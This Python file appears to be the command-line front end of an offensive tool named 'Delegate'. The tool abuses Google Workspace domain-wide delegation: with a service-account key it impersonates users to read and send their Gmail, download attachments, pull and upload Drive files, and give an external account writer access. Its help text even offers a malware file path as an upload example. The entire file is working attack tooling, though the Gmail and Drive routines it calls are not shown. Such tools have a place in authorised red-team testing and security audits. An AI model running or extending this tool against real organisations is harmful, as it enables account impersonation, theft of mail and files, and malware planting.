#!/usr/bin/env python

import argparse
from modules import gmailDumper
from modules import driveDumper

version = "2.1.0"

banner = """
██████╗ ███████╗██╗     ███████╗ ██████╗  █████╗ ████████╗███████╗
██╔══██╗██╔════╝██║     ██╔════╝██╔════╝ ██╔══██╗╚══██╔══╝██╔════╝
██║  ██║█████╗  ██║     █████╗  ██║  ███╗███████║   ██║   █████╗  
██║  ██║██╔══╝  ██║     ██╔══╝  ██║   ██║██╔══██║   ██║   ██╔══╝    
██████╔╝███████╗███████╗███████╗╚██████╔╝██║  ██║   ██║   ███████╗  v%s
╚═════╝ ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝  by @lutzenfried
""" % version

def main():
    print(banner)
    parser = argparse.ArgumentParser(description="Domain wide delegation feature to access Gmail and Drive features/data")
    parser.add_argument("-k", "--service-account-key", required=True, help="Path to service account key JSON file")
    parser.add_argument("-i", "--impersonate", required=True, help="Google Workspace user to impersonate")
    parser.add_argument("-m", "--mode", choices=["gmail", "drive"], required=True, help="Choose 'Gmail' or 'Drive' mode")
    parser.add_argument("-a", "--action", choices=["list", "read", "folders", "attachments", "send", "download", "upload", "permissions"], required=True, help="Choose actions to perform. Gmail: list, read, folders, attachments, send. Drive: list, folders, download, upload, permissions")
    parser.add_argument("-f", "--folder", required=False, help="Choose Gmail/Drive folder to access")
    parser.add_argument("-r", "--recipient", required=False, help="Recipient to send email to")
    parser.add_argument("-s", "--subject", required=False, help="Suject for the email to be send")
    parser.add_argument("-c", "--content", required=False, help="Content for the email to be send")
    parser.add_argument("-t", "--filename", required=False, help="Filename to read/download from Drive")
    parser.add_argument("-e", "--externalaccount", required=False, help="External account to give access to the document (Writer permission)")
    parser.add_argument("-p", "--filepath", required=False, help="Filepath and filename to upload within Drive. /home/user/malwawre.exe")
    
    args = parser.parse_args()

    # Gmail plugin
    if args.mode == "gmail" and args.action == "list" and args.folder:
        gmailDumper.listEmailFromLabel(args.service_account_key, args.impersonate, args.folder)
    elif args.mode == "gmail" and args.action == "read" and args.folder:
        gmailDumper.readFromLabel(args.service_account_key, args.impersonate, args.folder)
    elif args.mode == "gmail" and args.action == "list":
        gmailDumper.listEmails(args.service_account_key, args.impersonate)
    elif args.mode == "gmail" and args.action == "read":
        gmailDumper.readEmails(args.service_account_key, args.impersonate)
    elif args.mode == "gmail" and args.action == "folders":
        gmailDumper.listFolders(args.service_account_key, args.impersonate)
    elif args.mode == "gmail" and args.action == "attachments":
        gmailDumper.downloadAttachments(args.service_account_key, args.impersonate)
    elif args.mode == "gmail" and args.action == "send" and args.recipient and args.subject and args.content:
        gmailDumper.sendEmail(args.service_account_key, args.impersonate, args.recipient, args.subject, args.content)
        
    # Drive plugin
    elif args.mode == "drive" and args.action == "list":
        driveDumper.listFiles(args.service_account_key, args.impersonate)
    elif args.mode == "drive" and args.action == "folders":
        driveDumper.listFolders(args.service_account_key, args.impersonate)
    elif args.mode == "drive" and args.action == "download" and args.filename:
        driveDumper.downloadFiles(args.service_account_key, args.impersonate, args.filename)
    elif args.mode == "drive" and args.action == "upload" and args.impersonate and args.filename and args.filepath:
        driveDumper.uploadFiles(args.service_account_key, args.impersonate, args.filename, args.filepath, args.folder)     
    elif args.mode == "drive" and args.action == "permissions" and args.externalaccount and args.filename:
        driveDumper.modifyPermissions(args.service_account_key, args.impersonate, args.externalaccount, args.filename) 
        
    else:
        print("Invalid mode selected. Choose 'gmail' or 'drive'.")

if __name__ == "__main__":
    main()
